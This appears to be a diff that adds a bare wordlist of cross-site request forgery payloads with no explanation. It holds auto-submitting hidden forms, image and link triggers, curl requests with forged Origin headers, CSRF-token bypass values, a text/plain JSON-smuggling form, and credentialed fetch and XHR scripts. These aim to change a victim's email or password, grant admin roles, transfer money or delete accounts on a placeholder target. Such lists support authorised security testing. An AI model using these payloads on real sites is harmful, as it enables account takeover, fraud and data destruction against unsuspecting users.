@@ -1,0 +1,25 @@
+<form method="POST" action="https://target.com/account/email/change"><input type="hidden" name="email" value="attacker@evil.com"><input type="submit" value="Submit"></form>
+<form method="POST" action="https://target.com/account/password/change"><input type="hidden" name="password" value="hacked123"><input type="hidden" name="confirm_password" value="hacked123"><input type="submit" value="Submit"></form>
+<form method="POST" action="https://target.com/settings/email"><input type="hidden" name="new_email" value="attacker@evil.com"><input type="hidden" name="_token" value=""><input type="submit" value="Submit"></form>
+<html><body onload="document.forms[0].submit()"><form method="POST" action="https://target.com/api/transfer"><input type="hidden" name="to" value="attacker"><input type="hidden" name="amount" value="1000"></form></body></html>
+<img src="https://target.com/account/delete?confirm=yes">
+<img src="https://target.com/admin/users/1/delete">
+<a href="https://target.com/api/admin/user?role=admin&userId=attacker">click</a>
+curl -s -X POST https://target.com/api/settings -H "Content-Type: application/json" -H "Origin: https://attacker.com" -d '{"email":"attacker@evil.com"}'
+curl -s -X POST https://target.com/api/settings -H "Content-Type: text/plain" -d '{"email":"attacker@evil.com"}'
+curl -s -X POST https://target.com/api/transfer -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: null" -d "to=attacker&amount=1000"
+<form method="POST" action="https://target.com/api/action" enctype="text/plain"><input type="hidden" name='{"key":"value","ignore":"' value='"}'>
+<form method="POST" action="https://target.com/api/action"><input type="hidden" name="csrf_token" value=""><input type="submit"></form>
+<form method="POST" action="https://target.com/api/action"><input type="hidden" name="csrf_token" value="null"><input type="submit"></form>
+<form method="POST" action="https://target.com/api/action"><input type="hidden" name="csrf_token" value="undefined"><input type="submit"></form>
+<form method="POST" action="https://target.com/api/action"><input type="hidden" name="csrf_token" value="0"><input type="submit"></form>
+Referer: https://attacker.com
+Origin: https://attacker.com
+Origin: null
+SameSite=None; Secure (check if cookie is set without SameSite)
+<iframe src="https://target.com/settings" id="f"></iframe><form method="POST" action="https://target.com/settings/submit" target="f"></form>
+curl -s -X POST https://target.com/api/change-email -b "session={valid_session}" -H "Origin: https://attacker.com" -d "email=attacker@evil.com"
+curl -s -X DELETE https://target.com/api/account -b "session={valid_session}" -H "Origin: https://attacker.com"
+<script>fetch('https://target.com/api/settings',{method:'POST',credentials:'include',body:new URLSearchParams({email:'attacker@evil.com'})})</script>
+<script>fetch('https://target.com/api/transfer',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({to:'attacker',amount:1000})})</script>
+<script>var x=new XMLHttpRequest();x.open('POST','https://target.com/api/settings',true);x.withCredentials=true;x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({email:'attacker@evil.com'}))</script>
